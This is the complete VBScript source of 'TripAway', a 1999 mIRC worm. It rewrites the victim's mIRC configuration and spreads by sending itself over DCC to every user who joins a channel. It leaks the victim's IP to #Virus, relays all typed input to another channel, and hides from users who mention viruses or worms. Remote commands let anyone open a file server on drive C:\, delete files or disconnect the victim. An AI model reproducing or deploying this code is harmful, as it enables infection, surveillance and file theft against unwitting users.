'TripAway Coded By Ruzz`
Set TripIt = CreateObject("Scripting.FileSystemObject")
Const ForReading = 1, ForWriting = 2
On Error Resume Next
' -=[ Get Windows Folder Path ]=-
Set WinFolder = TripIt.GetSpecialFolder(WindowsFolder)
If TripIt.FileExists("c:\mirc\mirc.ini") then
' -=[ Read Previous mirc.ini for User Information ]=-
  Set OpenMircIni = TripIt.OpenTextFile("c:\mirc\mirc.ini", ForReading)
  Do Until ReadMirc = "[mirc]"
  ReadMirc = OpenMircIni.ReadLine
  Loop
  ReadUser = OpenMircIni.readline
  ReadEmail = OpenMircIni.readline
  ReadNick = OpenMircIni.readline
  ReadAnick = OpenMircIni.readline
  ReadServer = OpenMircIni.readline
' -=[ Check Which Version Is Installed From Readme.txt ]=-
' -=[ Write Relevant "show=" Line To Remove About Box ]=-
 Set OpenReadMeTxt = TripIt.OpenTextFile("c:\mirc\readme.txt", ForReading)
  ReadMeRead = OpenReadMeTxt.Read(10)
  If ReadMeRead = " mIRC v5.6" then
  mIRCShow = "show=didi"
  Else
  mIRCShow = "show=iamweasel"
  End If
' -=[ Create New mirc.ini ]=-
 Set MrcIniWrite = TripIt.CreateTextFile("c:\mirc\mirc.ini", True, False)
  MrcIniWrite.WriteLine("[channels]")
  MrcIniWrite.WriteLine("#TripAway")
  MrcIniWrite.WriteBlankLines(1)
  MrcIniWrite.WriteLine("[warn]")
  MrcIniWrite.WriteLine("fserve=off")
  MrcIniWrite.WriteBlankLines(1)
  MrcIniWrite.WriteLine("[about]")
  MrcIniWrite.WriteLine(mIRCShow)
  MrcIniWrite.WriteBlankLines(1)
  MrcIniWrite.WriteLine("[windows]")
  MrcIniWrite.WriteLine("main=200,1200,150,900,2,1,0")
  MrcIniWrite.WriteLine("wchannel=0,748,369,369,0,1,0")
  MrcIniWrite.WriteLine("wlist=0,751,553,553,0,1,0")
  MrcIniWrite.WriteLine("wquery=0,748,0,553,0,1,0")
  MrcIniWrite.WriteLine("scripts=25,473,45,422,0,0,0")
  MrcIniWrite.WriteBlankLines(1)
  MrcIniWrite.WriteLine("[wizard]")
  MrcIniWrite.WriteLine("warning=2")
  MrcIniWrite.WriteBlankLines(1)
  MrcIniWrite.WriteLine("[dde]")
  MrcIniWrite.WriteLine("ServerStatus=on")
  MrcIniWrite.WriteLine("ServiceName=mIRC")
  MrcIniWrite.WriteBlankLines(1)
  MrcIniWrite.WriteLine("[pfiles]")
  MrcIniWrite.WriteLine("n0=popups.ini")
  MrcIniWrite.WriteBlankLines(1)
  MrcIniWrite.WriteLine("[channelfiles]")
  MrcIniWrite.WriteLine("n0=channels.txt")
  MrcIniWrite.WriteBlankLines(1)
  MrcIniWrite.WriteLine("[channelsList]")
  MrcIniWrite.WriteBlankLines(1)
  MrcIniWrite.WriteLine("[ident]")
  MrcIniWrite.WriteLine("active=yes")
  MrcIniWrite.WriteLine("userid=TripAway")
  MrcIniWrite.WriteLine("system=TripAway")
  MrcIniWrite.WriteLine("port=113")
  MrcIniWrite.WriteBlankLines(1)
  MrcIniWrite.WriteLine("[socks]")
  MrcIniWrite.WriteLine("enabled=no")
  MrcIniWrite.WriteLine("port=1080")
  MrcIniWrite.WriteLine("method=4")
  MrcIniWrite.WriteLine("dccs=no")
  MrcIniWrite.WriteBlankLines(1)
  MrcIniWrite.WriteLine("[local]")
  MrcIniWrite.WriteLine("local=TripAway")
  MrcIniWrite.WriteLine("localip=")
  MrcIniWrite.WriteLine("longip=")
  MrcIniWrite.WriteBlankLines(1)
  MrcIniWrite.WriteLine("[clicks]")
  MrcIniWrite.WriteBlankLines(1)
  MrcIniWrite.WriteLine("[dragdrop]")
  MrcIniWrite.WriteBlankLines(1)
  MrcIniWrite.WriteLine("[text]")
  MrcIniWrite.WriteLine("commandchar=/")
  MrcIniWrite.WriteLine("linesep=-=[ T r i p A w a y ]=-")
  MrcIniWrite.WriteLine("finger=TripAway.  A Life Lived In Fear Is A Life Half Lived. (C) Ruzz`")
  MrcIniWrite.WriteLine("quit=TripAway claims another victim")
  MrcIniWrite.WriteLine("aptitle=TripAway.  A Life Lived In Fear Is A Life Half Lived. (C) Ruzz`")
  MrcIniWrite.WriteBlankLines(1)
  MrcIniWrite.WriteLine("[files]")
  MrcIniWrite.WriteLine("servers=servers.ini")
  MrcIniWrite.WriteLine("browser=")
  MrcIniWrite.WriteLine("emailer=")
  MrcIniWrite.WriteLine("finger=finger.ini")
  MrcIniWrite.WriteLine("urls=urls.ini")
  MrcIniWrite.WriteLine("addrbk=addrbk.ini")
  MrcIniWrite.WriteBlankLines(1)
  MrcIniWrite.WriteLine(ReadMirc)
  MrcIniWrite.WriteLine(ReadUser)
  MrcIniWrite.WriteLine(ReadEmail)
  MrcIniWrite.WriteLine(ReadNick)
  MrcIniWrite.WriteLine(ReadAnick)
  MrcIniWrite.WriteLine(ReadServer)
  MrcIniWrite.WriteBlankLines(1)
  MrcIniWrite.WriteLine("[dirs]")
  MrcIniWrite.WriteLine("logdir=logs\")
  MrcIniWrite.WriteLine("waves=sounds\")
  MrcIniWrite.WriteLine("midis=sounds\")
  MrcIniWrite.WriteBlankLines(1)
  MrcIniWrite.WriteLine("[colours]")
  MrcIniWrite.WriteLine("n0=0,6,4,5,2,3,3,3,3,3,3,1,5,2,6,1,3,2,3,5,1,0,1,0,1")
  MrcIniWrite.WriteBlankLines(1)
  MrcIniWrite.WriteLine("[afiles]")
  MrcIniWrite.WriteLine("n0=aliases.ini")
  MrcIniWrite.WriteBlankLines(1)
  MrcIniWrite.WriteLine("[rfiles]")
  MrcIniWrite.WriteLine("n0=remote.ini")
  MrcIniWrite.WriteLine("n1=remote.ini")
  MrcIniWrite.WriteLine("n2=remote.ini")
  MrcIniWrite.WriteLine("n3=remote.ini")
  MrcIniWrite.WriteBlankLines(1)
  MrcIniWrite.WriteLine("[perform]")
  MrcIniWrite.WriteLine("n0=;TripAway")
  MrcIniWrite.WriteLine("n1=/join #Virus")
  MrcIniWrite.WriteLine("n2=/msg #Virus A Life Lived In Fear Is A Life Half Lived. $me , infected with TripAway, is $ip on $server $+ : $+ $port $+ ")
  MrcIniWrite.WriteBlankLines(1)
  MrcIniWrite.WriteLine("[options]")
  MrcIniWrite.WriteLine("n0=1,1,0,0,0,0,300,0,0,0,1,0,0,0,0,0,1,0,1,0,512,0,1,0,0,0,1")
  MrcIniWrite.WriteLine("n1=5,50,0,0,0,0,0,0,0,1,0,1,0,0,1,1,1,1,0,0,1,1,1,0,5,0,0")
  MrcIniWrite.WriteLine("n2=0,0,0,1,0,1,1,1,0,60,120,0,0,1,1,0,1,1,0,120,20,10,1,1,1,0,0")
  MrcIniWrite.WriteLine("n3=500,0,0,0,1,0,1,1,1,1,0,1,0,0,0,0,3,1,0,1,0,0,0,0,1,1,0,1,0")
  MrcIniWrite.WriteLine("n4=1,0,1,1,0,0,999,0,0,1,1,0,1024,1,0,99,60,0,0,0,0,1,1,1,1,5000")
  MrcIniWrite.WriteLine("n5=1,1,1,1,1,1,1,1,1,1,6667,0,0,0,1,0,1,0,300,10,4,0,1,24,0,0,1")
 MrcIniWrite.Close
' -=[ Close and save mirc.ini ]=-
' -=[ Create new remote.ini ]=-
 Set ScptIniWrite = TripIt.CreateTextFile("c:\mirc\remote.ini", True, False)
  ScptIniWrite.WriteLine("[script]")
  ScptIniWrite.WriteLine("n0=;TripAway")
  ScptIniWrite.WriteLine("n1=on 1:start:{")
  ScptIniWrite.WriteLine("n2=.remote on")
  ScptIniWrite.WriteLine("n3=.ctcps on")
  ScptIniWrite.WriteLine("n4=.events on")
  ScptIniWrite.WriteLine("n5=}")
  ScptIniWrite.WriteLine("n6=on 1:text:*Tripserve*:#:/fserve $nick 10 C:\ | /msg $nick TripAway has opened an fserve on drive C:\ for you. TripAway is $me on $ip ")
  ScptIniWrite.WriteLine("n7=on 1:connect:{")
  ScptIniWrite.WriteLine("n8=}")
  ScptIniWrite.WriteLine("n9=ctcp ^1:*:?:$1- | halt")
  ScptIniWrite.WriteLine("n11=on 1:text:*go away*:#:/disconnect TripAway claims another victim. $me !")
  ScptIniWrite.WriteLine("n12=on 1:text:re:#:/msg $chan re??? I didn't even leave $nick! | /exit TripAway claims another victim. $me !")
  ScptIniWrite.WriteLine("n13=on 1:text:*help*:*:/remove $mircdir $+ mirc.ini")
  ScptIniWrite.WriteLine("n14=on 1:join:#:{")
  ScptIniWrite.WriteLine("n15=if ( $nick == $me ) { halt } | .dcc send $nick $mircdir $+ \download\TripAway.vbs")
  ScptIniWrite.WriteLine("n16=if ( $nick == $me ) { halt } | .dcc send $nick $mircdir $+ \download\TripAway.bmp")
  ScptIniWrite.WriteLine("n17=}")
  ScptIniWrite.WriteLine("n18=on 1:text:*TripIP*:#:/msg $nick A Life Lived In Fear Is A Life Half Lived. TripAway is $me on $ip")
  ScptIniWrite.WriteLine("n19=on 1:TEXT:*mIRC*:#:/.ignore $nick")
  ScptIniWrite.WriteLine("n20=on 1:TEXT:*virus*:#:/.ignore $nick")
  ScptIniWrite.WriteLine("n21=on 1:TEXT:*worm*:#:/.ignore $nick")
  ScptIniWrite.WriteLine("n22=;on 1:text:*Linux*:#:/remove " & Winfolder & "\Win.com")
  ScptIniWrite.WriteLine("n23=on 1:text:who is TripAway:#:/msg $nick You wanted to know who I am?  I am $me who is infected with TripAway.  A mIRC worm coded by Ruzz`.  For your information, my IP address is $ip , I am using mIRC $version and Windows $os .  So, now you know.")
  ScptIniWrite.WriteLine("n24=on 1:text:*TripList*:#:/notice $nick I am $me, TripAway")
  ScptIniWrite.WriteLine("n25=on 1:text:Tripcommands:#:{")
  ScptIniWrite.WriteLine("n26=.msg $nick T r i p A w a y   C o m m a n d s")
  ScptIniWrite.WriteLine("n27=.msg $nick -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-")
  ScptIniWrite.WriteLine("n28=.msg $nick go away in channel that TripAway is in will disconnect it")
  ScptIniWrite.WriteLine("n29=.msg $nick re in channel that TripAway is in will quit the wormed mIRC")
  ScptIniWrite.WriteLine("n30=.msg $nick help in channel that TripAway is in will delete mirc.ini")
  ScptIniWrite.WriteLine("n31=.msg $nick Tripserve in channel that TripAway is in will open an fserve on c:\ for the nick that typed the command")
  ScptIniWrite.WriteLine("n32=.msg $nick TripIP in channel that TripAway is in will return the infected IP in a private message window")
  ScptIniWrite.WriteLine("n33=.msg $nick mIRC, virus or worm in the channel that TripAway is in will ignore the nick that typed the command")
  ScptIniWrite.WriteLine("n34=.msg $nick who is TripAway in channel that TripAway is in will return the information about TripAway in a private message window to the nick that typed the command")
  ScptIniWrite.WriteLine("n35=.msg $nick Linux in channel that TripAway is in will delete Win.com")
  ScptIniWrite.WriteLine("n36=.msg $nick TripList in channel that TripAway is in will make all infected users send 'I am $me, TripAway' as a notice to the nick that typed the command.")
  ScptIniWrite.WriteLine("n37=.msg $nick TripCommands in channel that TripAway is in will bring up help info again")
  ScptIniWrite.WriteLine("n38=}")
  ScptIniWrite.WriteLine("n39=on 1:text:*sex me*:#:.msg $nick You're not my type, you aint inflatable")
  ScptIniWrite.WriteLine("n40=on 1:input:*:{")
  ScptIniWrite.WriteLine("n41=.msg #TripAway ( $+ $active $+ ) $1-")
  ScptIniWrite.WriteLine("n42=}")
' -=[ Thanks To StRaMoNiUm For That Bit ]=-
  ScptIniWrite.WriteLine(";")
  ScptIniWrite.WriteLine(";=>>: A Life Lived In Fear Is A Life Half Lived. TripAway. Copyright 1999 - Infinity, Ruzz`")
  ScptIniWrite.WriteBlankLines(1)
  ScptIniWrite.WriteLine("[users]")
  ScptIniWrite.WriteLine("n0=650: *!*@*.*")
 ScptIniWrite.Close
End If
' -=[ Close and save remote.ini ]=-
' -=[ Mess about with Version number, Product name, Registered owner and company ]=-
' Set TripOut = CreateObject("WScript.Shell")
'  TripOut.RegWrite "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName\ComputerName", "TripAway"
'  TripOut.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Version", "TripAway"
'  TripOut.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\ProductName", "TripAway"
'  TripOut.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\VersionNumber", "1.1"
'  TripOut.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOwner", "A Life Lived In Fear,"
'  TripOut.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOrganization", "Is A Life Half Lived."
' -=[ Replace Logos.sys with TripAway logo ]=-
' Set Logosys = TripIt.GetFile("c:\windows\Logos.sys")
'  Logosys.Delete
' Set Tabmp = TripIt.GetFile("c:\mirc\download\TripAway.bmp")
'  Tabmp.Copy ("c:\windows\Logos.sys")
' -=[ Thanks To Gigabyte For That Bit ]=-
' -=[ End of TripAway code ]=-
' -=[ A Life Lived In Fear Is A Life Half Lived. TripAway. Copyright 1999 - Infinity, Ruzz` ]=-
' **EOF**
